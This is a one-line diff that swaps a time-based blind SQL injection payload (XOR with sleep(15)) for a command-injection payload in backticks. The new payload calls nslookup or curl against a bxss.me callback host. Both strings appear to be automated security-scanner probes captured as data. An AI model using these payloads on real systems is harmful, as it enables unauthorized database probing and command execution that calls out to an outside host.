@@ -1,1 +1,1 @@
-5550"XOR(555*if(now()=sysdate(),sleep(15),0))XOR"Z
+`(nslookup -q=cname hittcwoyaujrp60fcf.bxss.me||curl hittcwoyaujrp60fcf.bxss.me)`
